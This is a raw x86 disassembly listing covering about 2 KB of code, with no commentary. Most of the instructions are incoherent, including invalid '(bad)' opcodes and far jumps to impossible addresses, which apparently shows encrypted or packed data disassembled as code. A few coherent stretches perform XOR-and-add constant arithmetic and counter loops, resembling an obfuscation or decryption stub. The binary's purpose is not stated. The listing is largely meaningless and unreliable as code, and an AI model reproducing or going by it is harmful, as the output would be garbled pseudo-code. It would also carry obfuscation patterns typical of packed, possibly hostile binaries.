  410821:	outs   dx,DWORD PTR ds:[esi]
  410822:	out    dx,eax
  410823:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410824:	cmp    eax,0xffb74952
  410829:	aad    0x99
  41082b:	repz push cs
  41082d:	mov    al,0x7a
  41082f:	(bad)  
  410830:	ss icebp 
  410832:	out    0x43,eax
  410834:	jg     0x4108aa
  410836:	inc    ecx
  410837:	sub    al,0x48
  410839:	adc    ebp,DWORD PTR [eax+0x6a847942]
  41083f:	gs in  al,dx
  410841:	loopne 0x410844
  410843:	inc    edi
  410844:	mov    BYTE PTR [edx+0x48],0x44
  410848:	stos   BYTE PTR es:[edi],al
  410849:	jmp    0x7f241e10
  41084e:	add    BYTE PTR [ecx],dl
  410850:	scas   eax,DWORD PTR es:[edi]
  410851:	mov    DWORD PTR [ecx],ebp
  410853:	test   DWORD PTR [eax+esi*4],0xad880e1e
  41085a:	xchg   esp,eax
  41085b:	jmp    0x8bf4:0x472d76f2
  410862:	sbb    BYTE PTR [ebx+0x71],bl
  410865:	push   eax
  410866:	aas    
  410867:	or     DWORD PTR [edi+0x65],eax
  41086a:	xchg   edx,eax
  41086b:	jle    0x410874
  41086d:	push   eax
  41086e:	(bad)  
  41086f:	fcomp  QWORD PTR [eax]
  410871:	adc    BYTE PTR [ecx],bl
  410873:	leave  
  410874:	dec    esi
  410875:	mov    ds:0x3907a7db,eax
  41087a:	(bad)  
  41087b:	jno    0x4107fe
  41087d:	pop    es
  41087e:	outs   dx,BYTE PTR ds:[esi]
  41087f:	jge    0x41083d
  410881:	pop    edi
  410882:	push   ds
  410883:	push   ebx
  410884:	nop
  410885:	retf   0x1982
  410888:	jb     0x41081e
  41088a:	and    DWORD PTR [esp+ebp*1-0x7e],esi
  41088e:	push   es
  41088f:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410891:	mov    ch,0x3a
  410893:	lahf   
  410894:	push   cs
  410895:	ffree  st(1)
  410897:	call   0x8881f0fd
  41089c:	aas    
  41089d:	(bad)  
  41089e:	(bad)  
  41089f:	nop
  4108a0:	fbstp  TBYTE PTR [esi]
  4108a2:	in     al,0xff
  4108a4:	lds    esp,FWORD PTR [eax]
  4108a6:	inc    ebp
  4108a7:	scas   eax,DWORD PTR es:[edi]
  4108a8:	xchg   DWORD PTR [edx+esi*4],ebx
  4108ab:	and    eax,0x4164ee4a
  4108b0:	ins    BYTE PTR es:[edi],dx
  4108b1:	mov    bl,0x3b
  4108b3:	jecxz  0x410877
  4108b5:	mov    al,BYTE PTR [edx-0x5addffda]
  4108bb:	arpl   WORD PTR [edi+0x74],bx
  4108be:	jmp    0xdbe1:0xe1f54c1
  4108c5:	clc    
  4108c6:	out    0x5b,al
  4108c8:	aam    0xbc
  4108ca:	ds mov al,0xd0
  4108cd:	push   cs
  4108ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108d0:	imul   BYTE PTR [esi]
  4108d2:	jbe    0x41094e
  4108d4:	xchg   edx,eax
  4108d5:	mov    esp,ebx
  4108d7:	jo     0x41093e
  4108d9:	je     0x4108e8
  4108db:	lods   eax,DWORD PTR ds:[esi]
  4108dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108dd:	retf   
  4108de:	xor    bh,BYTE PTR [edx-0x7a]
  4108e1:	jg     0x4108fe
  4108e3:	call   0x6d177ad
  4108e8:	(bad)  
  4108e9:	mov    ebx,0x4e797215
  4108ee:	adc    dh,ah
  4108f0:	fst    st(2)
  4108f2:	aam    0x59
  4108f4:	popa   
  4108f5:	ins    DWORD PTR es:[edi],dx
  4108f6:	sahf   
  4108f7:	push   ds
  4108f8:	fistp  WORD PTR [ebx+0x18]
  4108fb:	mov    esp,0xb76b4b53
  410900:	popf   
  410901:	jl     0x4108bb
  410903:	nop
  410904:	dec    ecx
  410905:	icebp  
  410906:	or     BYTE PTR [esi+0x65082344],dh
  41090c:	(bad)  
  41090e:	loopne 0x4108d3
  410910:	xor    dl,ah
  410912:	std    
  410913:	push   0x585de15a
  410918:	push   esp
  410919:	into   
  41091a:	dec    eax
  41091b:	rcl    DWORD PTR [eax+0x64],1
  41091e:	xor    eax,0xe31b73b3
  410923:	mov    DWORD PTR [edx],ebp
  410925:	bound  edx,QWORD PTR [esi+0x3e]
  410928:	cmp    DWORD PTR [eax],ecx
  41092a:	jmp    0xd37caf45
  41092f:	sub    al,0x14
  410931:	pop    edx
  410932:	xchg   ecx,eax
  410933:	add    eax,0xe656e53a
  410938:	inc    esp
  410939:	mov    al,ds:0x5317201f
  41093e:	pop    edi
  41093f:	test   al,0x53
  410941:	addr16 in al,0xc5
  410944:	mov    bl,0x81
  410946:	add    ebx,DWORD PTR [edx]
  410948:	gs call 0xe21:0x43ec0d8c
  410950:	inc    esp
  410951:	lea    edi,[eax+0x34]
  410954:	push   es
  410955:	mov    dl,0x78
  410957:	xchg   ecx,eax
  410958:	mov    eax,ds:0x4639c103
  41095d:	push   esp
  41095e:	pop    esi
  41095f:	je     0x41096d
  410965:	mov    eax,DWORD PTR [ebp+0x8]
  410968:	jmp    0x410986
  41096d:	mov    eax,DWORD PTR [ebp-0x4]
  410970:	xor    eax,edx
  410972:	add    eax,ecx
  410974:	jmp    0x410986
  410979:	mov    eax,DWORD PTR [ebp-0x4]
  41097c:	xor    eax,0x7510851
  410981:	add    eax,0x327299
  410986:	leave  
  410987:	ret    0x4
  41098a:	push   ebp
  41098b:	mov    ebp,esp
  41098d:	push   ecx
  41098e:	mov    ecx,DWORD PTR [ebp+0x8]
  410991:	and    DWORD PTR ds:0x43456f,0x0
  41099b:	mov    eax,ds:0x43456f
  4109a0:	inc    eax
  4109a1:	mov    ds:0x43456f,eax
  4109a6:	cmp    DWORD PTR ds:0x43456f,0x9
  4109ad:	jne    0x4109c9
  4109b3:	push   0x61e9
  4109b8:	push   DWORD PTR [ebp-0x28]
  4109bb:	push   DWORD PTR [ebp-0x28]
  4109be:	push   0x6f4e
  4109c3:	call   DWORD PTR ds:0x4132a8
  4109c9:	cmp    DWORD PTR ds:0x43456f,0x8
  4109d0:	jne    0x4109e1
  4109d6:	mov    eax,ds:0x43456f
  4109db:	inc    eax
  4109dc:	mov    ds:0x43456f,eax
  4109e1:	cmp    DWORD PTR ds:0x43456f,0x17
  4109e8:	jb     0x41099b
  4109ee:	movzx  eax,BYTE PTR ds:0x43464f
  4109f5:	adc    DWORD PTR ds:0x434563,eax
  4109fb:	mov    eax,0x7510851
  410a00:	and    DWORD PTR ds:0x43463b,0x46b5
  410a0a:	xor    ecx,eax
  410a0c:	add    ecx,0x327299
  410a12:	mov    DWORD PTR ds:0x434587,0x530c
  410a1c:	jmp    0x410cd8
  410a21:	cmp    eax,0x7d22e5f8
  410a26:	arpl   bp,di
  410a28:	mov    DWORD PTR [ebx+0x2d],esp
  410a2b:	arpl   di,bp
  410a2d:	lds    esp,FWORD PTR [ebx+0x6d]
  410a30:	js     0x4109dc
  410a32:	inc    edx
  410a33:	jle    0x410ab3
  410a35:	popf   
  410a36:	js     0x410ab6
  410a38:	jle    0x410a36
  410a3a:	inc    ecx
  410a3b:	mov    ah,0x98
  410a3d:	mov    es:0xda3085d5,al
  410a43:	mov    esi,0xc5c2f88b
  410a48:	dec    ebx
  410a49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a4a:	mov    DWORD PTR [eax+0x5c],edx
  410a4d:	and    BYTE PTR [eax],ah
  410a4f:	mov    DWORD PTR [ecx+0xb62b832],ebx
  410a55:	dec    esi
  410a56:	stos   DWORD PTR es:[edi],eax
  410a57:	pop    esi
  410a58:	add    BYTE PTR [ebp+0x6d],dl
  410a5b:	cld    
  410a5c:	jecxz  0x410a2d
  410a5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a5f:	xchg   ecx,eax
  410a60:	push   eax
  410a61:	ret    
  410a62:	mov    bh,0xe4
  410a64:	call   0x81ee:0xbda6d3e2
  410a6b:	adc    eax,0x5d2e47e9
  410a70:	sub    eax,0x715183f8
  410a75:	fwait
  410a76:	out    dx,eax
  410a77:	sub    dh,BYTE PTR [esi]
  410a79:	idiv   DWORD PTR [edx+0x293307d5]
  410a7f:	(bad)  
  410a80:	ds and eax,eax
  410a83:	add    ebp,esp
  410a85:	push   0xe227cbf6
  410a8a:	jae    0x410a6c
  410a8c:	(bad)  
  410a8d:	int    0xa0
  410a8f:	and    ch,BYTE PTR [ecx-0x41]
  410a92:	repnz cmp al,0x9c
  410a95:	(bad)  [esi+ebx*8-0xe]
  410a99:	xlat   BYTE PTR ds:[ebx]
  410a9a:	(bad)  
  410a9b:	loopne 0x410ab0
  410a9d:	jl     0x410b15
  410a9f:	mov    esp,0xe8ab28eb
  410aa4:	stos   BYTE PTR es:[edi],al
  410aa5:	shl    DWORD PTR [edi-0x13],1
  410aa8:	adc    al,0xec
  410aaa:	sub    al,0x27
  410aac:	adc    al,0xc9
  410aae:	in     eax,0xf2
  410ab0:	imul   eax,DWORD PTR [edx+0x518efa47],0x7c6e6e78
  410aba:	push   edi
  410abb:	xchg   ah,bl
  410abd:	push   es
  410abe:	jne    0x410a41
  410ac0:	mov    eax,ds:0x18b48342
  410ac5:	sbb    edx,DWORD PTR [ebp-0xb418810]
  410acb:	inc    ebp
  410acc:	(bad)  
  410acd:	cmp    eax,edx
  410acf:	fstp   TBYTE PTR [edx-0x34b69379]
  410ad5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ad6:	pop    esp
  410ad7:	push   cs
  410ad8:	(bad)  
  410ad9:	lock adc al,0xbe
  410adc:	sbb    eax,DWORD PTR [edx-0x70]
  410adf:	adc    DWORD PTR [eax+esi*1+0x3e],ebp
  410ae3:	mov    edx,0x4d57a5ec
  410ae8:	xchg   esi,eax
  410ae9:	cld    
  410aea:	sub    dl,bl
  410aec:	imul   ebx,DWORD PTR [ecx+0xc70ebc7],0xac374d48
  410af6:	popa   
  410af7:	add    edi,eax
  410af9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410afa:	rcr    BYTE PTR [ebp-0x10],cl
  410afd:	or     cl,BYTE PTR [edx+0x6d]
  410b00:	mov    ebx,0x8f865f79
  410b05:	ins    BYTE PTR es:[edi],dx
  410b06:	pop    ds
  410b07:	add    BYTE PTR [eax+edi*1-0x21dcc0ce],dl
  410b0e:	mov    cs,WORD PTR [eax]
  410b10:	mov    dl,0xb7
  410b12:	mov    bh,0x4c
  410b14:	rcr    BYTE PTR [ebp+0x1f],cl
  410b17:	pop    ebx
  410b18:	adc    DWORD PTR ds:0xd1e64b8b,edx
  410b1e:	mov    cs,WORD PTR [ebp+0x49e1721d]
  410b24:	fdiv   DWORD PTR ds:0x3763fb42
  410b2a:	jl     0x410b70
  410b2c:	add    edx,edx
  410b2e:	test   edi,ebp
  410b30:	push   0x1f
  410b32:	jle    0x410b08
  410b34:	xlat   BYTE PTR ds:[ebx]
  410b35:	mov    eax,ds:0x81baebf4
  410b3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b3b:	jle    0x410ac4
  410b3d:	div    DWORD PTR [bx+di-0xf]
  410b41:	je     0x410bbb
  410b43:	push   ecx
  410b44:	ds pop esi
  410b46:	scas   al,BYTE PTR es:[edi]
  410b47:	inc    ebx
  410b48:	(bad)  
  410b49:	jnp    0x410b0f
  410b4b:	inc    esi
  410b4c:	push   ds
  410b4d:	cwde   
  410b4e:	mov    gs,WORD PTR [edi-0x36]
  410b51:	cwde   
  410b52:	mov    edx,0xe2e4e625
  410b57:	jne    0x410bb3
  410b59:	mov    edx,0x25242775
  410b5e:	sbb    DWORD PTR [ebx+0x5a78dc82],esp
  410b64:	push   ecx
  410b65:	stos   DWORD PTR es:[edi],eax
  410b66:	icebp  
  410b67:	inc    ebp
  410b68:	nop
  410b69:	mov    ch,0x1c
  410b6b:	rol    BYTE PTR [ecx-0x7152f050],cl
  410b71:	inc    ecx
  410b72:	jbe    0x410b46
  410b74:	xlat   BYTE PTR ds:[ebx]
  410b75:	push   0xd67dc54a
  410b7a:	xor    eax,0x9ddacc63
  410b7f:	scas   al,BYTE PTR es:[edi]
  410b80:	cdq    
  410b81:	add    DWORD PTR [eax+0x1e4da12b],esi
  410b87:	and    ah,BYTE PTR [ebp-0x518806bd]
  410b8d:	pop    edx
  410b8e:	mov    ds:0x7aa398de,al
  410b93:	fs in  eax,dx
  410b95:	jmp    0x410b1d
  410b97:	xor    BYTE PTR [esi],ch
  410b99:	iret   
  410b9a:	adc    DWORD PTR [ecx+0x3f2245f6],0xffffffba
  410ba1:	or     BYTE PTR [edi+0x66],ch
  410ba4:	(bad)  
  410ba5:	mov    esp,0x36b6fc2e
  410baa:	sub    eax,0x7cfa3fe4
  410baf:	sub    eax,0x59cfadda
  410bb4:	adc    eax,0x1ae71003
  410bb9:	daa    
  410bba:	xor    DWORD PTR [esi],ebx
  410bbc:	test   DWORD PTR [esi-0x55],ecx
  410bbf:	dec    edi
  410bc0:	and    ah,BYTE PTR [edi]
  410bc2:	shl    esi,cl
  410bc4:	mov    eax,ds:0x67a6dc83
  410bc9:	std    
  410bca:	jmp    0x173d:0x956c6e35
  410bd1:	push   ebx
  410bd2:	inc    ebp
  410bd3:	scas   eax,DWORD PTR es:[edi]
  410bd4:	dec    ecx
  410bd5:	imul   esi,DWORD PTR [edx],0x3100f82b
  410bdb:	test   DWORD PTR [ebx+0x11],eax
  410bde:	mov    al,ds:0x13e60b8e
  410be3:	dec    edx
  410be4:	clc    
  410be5:	stos   BYTE PTR es:[edi],al
  410be6:	or     al,0x86
  410be8:	pop    DWORD PTR [ecx]
  410bea:	and    al,0x7
  410bec:	lds    esp,FWORD PTR [ecx-0x55d622dc]
  410bf2:	out    dx,eax
  410bf3:	push   0xfb0c6a5
  410bf8:	xchg   BYTE PTR [edx+0x67],bh
  410bfb:	fs test eax,0x9d0538a1
  410c01:	push   ebp
  410c02:	push   edi
  410c03:	xchg   BYTE PTR [edx-0x62],dl
  410c06:	leave  
  410c07:	dec    esp
  410c08:	xchg   esi,eax
  410c09:	arpl   WORD PTR [ecx],ax
  410c0b:	push   es
  410c0c:	fwait
  410c0d:	scas   al,BYTE PTR es:[edi]
  410c0e:	inc    eax
  410c0f:	lods   eax,DWORD PTR ds:[esi]
  410c10:	(bad)  
  410c12:	cmp    eax,0x2e2d6492
  410c17:	xchg   ebx,eax
  410c18:	jns    0x410bca
  410c1a:	ja     0x410b9c
  410c1c:	test   BYTE PTR [ecx+ecx*2],ch
  410c1f:	rcl    BYTE PTR [edx-0x21],cl
  410c22:	repz jle 0x410bdb
  410c25:	js     0x410c92
  410c27:	or     ebp,edi
  410c29:	push   eax
  410c2a:	nop
  410c2b:	jle    0x410c26
  410c2d:	in     al,0x45
  410c2f:	mov    ds:0x12881fc2,al
  410c34:	in     al,0x7a
  410c36:	dec    ebx
  410c37:	aad    0x8b
  410c39:	adc    al,0x78
  410c3b:	adc    DWORD PTR [eax],ebp
  410c3d:	cmp    DWORD PTR [edx-0x40f98db7],0xb9b33c38
  410c47:	lock adc ch,BYTE PTR [ecx-0x2c7b223c]
  410c4e:	and    DWORD PTR [edx+eiz*1],esi
  410c51:	mov    bh,0xf5
  410c53:	ins    BYTE PTR es:[edi],dx
  410c54:	mov    dl,bh
  410c56:	punpcklwd mm5,DWORD PTR [bx+si+0x72a8]
  410c5c:	addr16 popa 
  410c5e:	jg     0x410cbb
  410c60:	nop
  410c61:	fiadd  WORD PTR [edx]
  410c63:	cmp    DWORD PTR [eax+0x421480b6],0x65
  410c6a:	dec    esi
  410c6b:	test   al,0x2c
  410c6d:	stos   BYTE PTR es:[edi],al
  410c6e:	push   esp
  410c6f:	push   es
  410c70:	mov    bl,0xe3
  410c72:	fmul   QWORD PTR [ecx-0xe73a198]
  410c78:	sqrtps xmm5,xmm1
  410c7b:	js     0x410cb6
  410c7d:	scas   eax,DWORD PTR es:[edi]
  410c7e:	mov    al,0xb
  410c80:	xlat   BYTE PTR ds:[ebx]
  410c81:	xor    BYTE PTR [edi-0x281b75c3],0x51
  410c88:	xchg   BYTE PTR [ebp-0x7709ade5],bh
  410c8e:	mov    dl,0xa2
  410c90:	jp     0x410c45
  410c92:	xor    cl,ah
  410c94:	lock les edx,FWORD PTR [ecx+0x356ebc02]
  410c9b:	inc    ecx
  410c9c:	adc    DWORD PTR [ecx],eax
  410c9e:	lods   eax,DWORD PTR ds:[esi]
  410c9f:	aad    0xc9
  410ca1:	jp     0x410ca2
  410ca3:	rcl    BYTE PTR [ebp+edi*1-0x6d],1
  410ca7:	mov    DWORD PTR [ebx],esp
  410ca9:	(bad)  
  410caa:	adc    ecx,DWORD PTR [edx+0x34ab2754]
  410cb0:	dec    ebx
  410cb1:	fcomp  DWORD PTR [ecx-0x6842816d]
  410cb7:	mov    ecx,0xdaf0f1d
  410cbc:	lds    esp,FWORD PTR [edx+0x42a2d585]
  410cc2:	cwde   
  410cc3:	adc    DWORD PTR [ebp-0x22dcfe4d],eax
  410cc9:	test   BYTE PTR [esi],dl
  410ccb:	sbb    al,0x47
  410ccd:	cs and al,0xa5
  410cd0:	and    al,0x1a
  410cd2:	arpl   WORD PTR [ebx+eax*8-0x766d665c],ax
  410cd9:	dec    ebp
  410cda:	adc    BYTE PTR [ebx+0x4346470d],cl
  410ce0:	add    bh,al
  410ce2:	inc    ebp
  410ce3:	or     BYTE PTR [edx-0x38f0cb32],bh
  410ce9:	inc    ebp
  410cea:	cld    
  410ceb:	cmp    eax,0x8bf89c85
  410cf0:	or     eax,0x434563
  410cf5:	mov    ecx,0xf89c8539
  410cfa:	push   esi
  410cfb:	mov    DWORD PTR [ebp+0x10],0x70019f8
  410d02:	mov    DWORD PTR ds:0x43468b,edx
  410d08:	mov    esi,DWORD PTR [ebp-0x4]
  410d0b:	cmp    ecx,esi
  410d0d:	mov    DWORD PTR ds:0x434693,0x165f
  410d17:	je     0x411018
  410d1d:	mov    esi,DWORD PTR [ebp+0xc]
  410d20:	xor    ecx,eax
  410d22:	sub    DWORD PTR ds:0x434647,0x434603
  410d2c:	xor    esi,eax
  410d2e:	xor    DWORD PTR ds:0x434687,0x6bfa
  410d38:	lea    ecx,[esi+ecx*1+0x327299]
  410d3f:	xor    ecx,eax
  410d41:	cmp    ecx,0xf89c8526
  410d47:	jne    0x410cfb
  410d4d:	mov    DWORD PTR ds:0x43460f,0x7d20
  410d57:	jmp    0x411302
  410d5c:	jmp    0x411018
  410d61:	inc    ebp
  410d62:	lods   al,BYTE PTR ds:[esi]
  410d63:	xchg   DWORD PTR [ebx],ebx
  410d65:	addr16 and eax,0xe5906c6d
  410d6b:	mov    DWORD PTR [ebx+0x38cb73d4],esi
  410d71:	leave  
  410d72:	dec    ebp
  410d73:	jle    0x410df3
  410d75:	popf   
  410d76:	js     0x410df6
  410d78:	jle    0x410d9d
  410d7a:	jl     0x410df8
  410d7c:	loope  0x410dc4
  410d7e:	rol    bh,1
  410d80:	fidivr DWORD PTR [edx+0x6ae6497c]
  410d86:	inc    eax
  410d87:	mov    esi,0x5a624507
  410d8c:	cmp    BYTE PTR [eax-0x34],ah
  410d8f:	push   cs
  410d90:	mov    edx,0x7001aed8
  410d95:	add    eax,esp
  410d97:	fmul   DWORD PTR [ebx-0x48d7e855]
  410d9d:	mov    eax,0xa768f3f9
  410da2:	inc    edi
  410da3:	add    dh,cl
  410da5:	retf   
  410da6:	rol    BYTE PTR [esi-0x5cc1820e],0x51
  410dad:	adc    bl,bh
  410daf:	pop    edi
  410db0:	sbb    eax,DWORD PTR [edx]
  410db2:	je     0x410df4
  410db4:	lea    ebx,[edi+0x6e]
  410db7:	call   0xaf8b4e5a
  410dbc:	call   0xa388996c
  410dc1:	loopne 0x410d5c
  410dc3:	mov    dl,bh
  410dc5:	push   cs
  410dc6:	dec    esi
  410dc7:	lock jo 0x410d83
  410dca:	or     bh,bl
  410dcc:	(bad)  
  410dcd:	mov    eax,ds:0x25b844f9
  410dd2:	out    dx,al
  410dd3:	mov    eax,ds:0x961514db
  410dd8:	cmp    edx,esi
  410dda:	jle    0x410e40
  410ddc:	icebp  
  410ddd:	in     al,0x5b
  410ddf:	push   ebx
  410de0:	adc    al,BYTE PTR [eax]
  410de2:	xlat   BYTE PTR fs:[ebx]
  410de4:	push   edi
  410de5:	or     eax,0xf23a9309
  410dea:	dec    edx
  410deb:	dec    eax
  410dec:	cld    
  410ded:	pop    ebp
  410dee:	ds (bad) 
  410df0:	jmp    0x558d7158
  410df5:	pop    ecx
  410df6:	shl    DWORD PTR [edx-0x49],cl
  410df9:	inc    edx
  410dfa:	popa   
  410dfb:	fs in  al,dx
  410dfd:	inc    ecx
  410dfe:	push   ds
  410dff:	retf   0xbb5c
  410e02:	or     BYTE PTR [edx+0x59a18afe],bl
  410e08:	pop    ebp
  410e09:	cld    
  410e0a:	xor    ch,ah
  410e0c:	jle    0x410dc1
  410e0e:	or     BYTE PTR [eax+0x32],bl
  410e11:	(bad)  
  410e12:	arpl   WORD PTR [edi],cx
  410e14:	and    al,0x5a
  410e16:	ss test eax,0xe4edfff8
  410e1c:	adc    al,ch
  410e1e:	aaa    
  410e1f:	push   es
  410e20:	fild   WORD PTR [edi]
  410e22:	loop   0x410e6a
  410e24:	push   es
  410e25:	fcomp  st(6)
  410e27:	fld    QWORD PTR [eax-0x2aafa701]
  410e2d:	cmp    dl,al
  410e2f:	jecxz  0x410dfa
  410e31:	pop    edi
  410e32:	jns    0x410e94
  410e34:	fimul  WORD PTR [esi+edx*1]
  410e37:	imul   ebp,DWORD PTR [ebp+0x64b8db80],0x638d042c
  410e41:	ins    BYTE PTR es:[edi],dx
  410e42:	fcom   QWORD PTR [ebx]
  410e44:	sbb    BYTE PTR [ebx],0x14
  410e47:	pusha  
  410e48:	mov    ch,0x76
  410e4a:	ja     0x410e54
  410e4c:	leave  
  410e4d:	(bad)  
  410e4e:	mov    ebp,0xb3f73a7
  410e53:	cli    
  410e54:	dec    ebx
  410e55:	retf   0xef59
  410e58:	(bad)  
  410e59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e5a:	bnd jo 0x410deb
  410e5d:	inc    ch
  410e5f:	xor    edi,esi
  410e61:	sub    DWORD PTR [ecx+0x76],ebp
  410e64:	or     eax,0x16efc1f0
  410e69:	js     0x410e77
  410e6b:	adc    al,0xc4
  410e6d:	dec    DWORD PTR [eax-0x4c]
  410e70:	dec    ecx
  410e71:	add    BYTE PTR [ecx+edi*4-0x2c],al
  410e75:	leave  
  410e76:	ss ins BYTE PTR es:[edi],dx
  410e78:	(bad)  
  410e79:	mov    bl,0x7c
  410e7b:	scas   eax,DWORD PTR es:[edi]
  410e7c:	(bad)  
  410e7d:	jae    0x410e68
  410e7f:	push   edx
  410e80:	enter  0x85d1,0xfc
  410e84:	fsub   QWORD PTR [edi]
  410e86:	cmovg  edi,eax
  410e89:	xor    DWORD PTR [ebp+ebp*2+0x14],0xe3ed3266
  410e91:	mov    dl,0x9
  410e93:	mov    bh,0xaf
  410e95:	jnp    0x410ec1
  410e97:	mov    ah,0x2
  410e99:	mov    ch,0x97
  410e9b:	repnz fst DWORD PTR [ebp-0x6]
  410e9f:	jmp    0x410eaf
  410ea1:	ins    BYTE PTR es:[edi],dx
  410ea2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ea3:	es push 0x4d
  410ea6:	aam    0x7a
  410ea8:	es mov ebp,0xd931b8d6
  410eae:	and    BYTE PTR [ebp-0x3491e342],ah
  410eb4:	icebp  
  410eb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410eb6:	add    ebx,ebx
  410eb8:	xchg   ecx,eax
  410eb9:	xchg   ecx,eax
  410eba:	loop   0x410f2d
  410ebc:	mov    ds:0x94c877ec,al
  410ec1:	xor    DWORD PTR [eax-0x63],esp
  410ec4:	aad    0x4c
  410ec6:	dec    edi
  410ec7:	cmp    DWORD PTR [ebp-0x67],esp
  410eca:	in     al,0xe
  410ecc:	mov    ds:0x1ca643fa,al
  410ed1:	push   es
  410ed2:	mov    edx,esp
  410ed4:	test   BYTE PTR [esi-0x28],dh
  410ed7:	add    ebp,DWORD PTR [eax]
  410ed9:	fldcw  WORD PTR [esi-0x67]
  410edc:	jle    0x410ea6
  410ede:	bound  ebx,QWORD PTR [esi-0x5e28a504]
  410ee4:	adc    al,0xcc
  410ee6:	ins    BYTE PTR es:[edi],dx
  410ee7:	stos   BYTE PTR es:[edi],al
  410ee8:	aam    0x34
  410eea:	jae    0x410ebf
  410eec:	bound  esi,QWORD PTR [ecx-0x3992d206]
  410ef2:	xchg   ebx,eax
  410ef3:	test   al,0x1f
  410ef5:	jnp    0x410f3e
  410ef7:	cmp    DWORD PTR [ebx+0x3717196f],ebp
  410efd:	scas   eax,DWORD PTR es:[edi]
  410efe:	or     DWORD PTR [esi-0xb],0x34
  410f02:	add    ah,BYTE PTR [esi-0x5f]
  410f05:	(bad)  
  410f06:	hlt    
  410f07:	sbb    al,0x85
  410f09:	mov    ds:0xb600af1,al
  410f0e:	outs   dx,DWORD PTR ds:[esi]
  410f0f:	mov    bl,0x0
  410f11:	jbe    0x410eb3
  410f13:	loope  0x410f5a
  410f15:	dec    edx
  410f16:	fistp  DWORD PTR [ecx-0x768f14ca]
  410f1c:	psraw  mm6,QWORD PTR [ecx+0x6d]
  410f20:	lods   al,BYTE PTR ds:[esi]
  410f21:	add    DWORD PTR [esi-0x1d],0xffffffce
  410f25:	add    edi,DWORD PTR [esi]
  410f27:	retf   0x12aa
  410f2a:	push   esp
  410f2b:	popf   
  410f2c:	shl    edi,0x24
  410f2f:	mov    ebx,DWORD PTR [ebp-0x4f71ed8f]
  410f35:	mov    DWORD PTR [edx],edx
  410f37:	lea    edi,[ebp-0x73]
  410f3a:	mov    ch,0x67
  410f3c:	inc    ebx
  410f3d:	and    ecx,DWORD PTR [ebp-0x49]
  410f40:	fucomp st(3)
  410f42:	stos   DWORD PTR es:[edi],eax
  410f43:	shr    BYTE PTR [ecx],cl
  410f45:	rcr    DWORD PTR [ecx+0x3fb266d1],0xf7
  410f4c:	int3   
  410f4d:	ins    DWORD PTR es:[edi],dx
  410f4e:	(bad)  
  410f4f:	cmp    BYTE PTR [ebx],dl
  410f51:	out    0xc4,eax
  410f53:	mov    esi,edx
  410f55:	bound  edx,QWORD PTR [esi]
  410f57:	cdq    
  410f58:	jg     0x410f0c
  410f5a:	js     0x410f16
  410f5c:	pop    ds
  410f5d:	lea    ebp,[edi-0x3db1bbe6]
  410f63:	inc    edi
  410f64:	xchg   esi,eax
  410f65:	dec    ebp
  410f66:	push   edi
  410f67:	mov    bl,0x9b
  410f69:	mov    es,WORD PTR [edi-0x41]
  410f6c:	addr16 jmp 0xb227:0xedbe4362
  410f74:	mov    eax,0xb38306b5
  410f79:	pop    esi
  410f7a:	fnstenv [edi]
  410f7c:	xchg   DWORD PTR [edx+eiz*2+0x7dabb94e],edx
  410f83:	add    DWORD PTR [edi],eax
  410f85:	dec    ebp
  410f86:	shl    DWORD PTR [ebx-0x50],cl
  410f89:	cld    
  410f8a:	add    BYTE PTR [eax-0x6b8cd986],bh
  410f90:	mov    eax,ds:0x9f2cb05e
  410f95:	scas   al,BYTE PTR es:[edi]
  410f96:	icebp  
  410f97:	xchg   ebx,eax
  410f98:	pop    ebp
  410f99:	xchg   BYTE PTR [ebx],ch
  410f9b:	dec    ebx
  410f9c:	sub    DWORD PTR [ebp+0x1],0x74
  410fa0:	xchg   edi,eax
  410fa1:	out    dx,eax
  410fa2:	sub    eax,0x15865b05
  410fa7:	adc    al,BYTE PTR [esi+0x1cd846ed]
  410fad:	test   DWORD PTR [eax+edx*4-0x64],ebp
  410fb1:	mov    ecx,0xeaffddbb
  410fb6:	add    al,0x25
  410fb8:	mov    ebp,0x25709c9c
  410fbd:	pushf  
  410fbe:	mov    eax,ds:0xe212f5e1
  410fc3:	mov    ebx,0xe1b93c6e
  410fc8:	ds mov eax,0xf6dabcd2
  410fce:	mov    WORD PTR [edx+eiz*8],gs
  410fd1:	clc    
  410fd2:	adc    edi,DWORD PTR [ebp+ebp*8-0x6289e09f]
  410fd9:	push   esp
  410fda:	(bad)  
  410fdb:	fwait
  410fdc:	and    ch,BYTE PTR [ecx]
  410fde:	push   es
  410fdf:	(bad)  
  410fe1:	out    0x43,al
  410fe3:	lahf   
  410fe4:	cdq    
  410fe5:	fs fwait
  410fe7:	sahf   
  410fe8:	inc    eax
  410fe9:	push   ss
  410fea:	test   eax,0x88ca5480
  410fef:	enter  0xabf,0x86
  410ff3:	cmp    BYTE PTR [esi-0x49],0x28
  410ff7:	cmp    DWORD PTR [edx-0x53],edi
  410ffa:	cdq    
  410ffb:	and    BYTE PTR [ecx],al
  410ffd:	add    DWORD PTR [edi+0x6aed1c8],edi
  411003:	mov    al,ds:0x87f21a3c
  411008:	out    dx,al
  411009:	jp     0x410fc8
  41100b:	push   es
  41100c:	pop    ss
  41100d:	mov    al,0xc0
  41100f:	jecxz  0x410f99
  411011:	push   0x5549533e
  411016:	dec    ecx
  411017:	ds add ecx,0xffcd8d67
  41101e:	mov    esi,ecx
  411020:	xor    esi,eax
  411022:	add    esi,DWORD PTR [ebp+0x8]
  411025:	mov    DWORD PTR [ebp+0x8],esi
  411028:	mov    esi,DWORD PTR [ebp+0x8]
  41102b:	xor    esi,ecx
  41102d:	jmp    0x4112e9
  411032:	jo     0x41107c
  411034:	rsqrtps xmm6,XMMWORD PTR [edi]
  411037:	pop    ebp
  411038:	jge    0x4110ae
  41103a:	pop    ecx
  41103b:	mov    ebx,0x8c124754
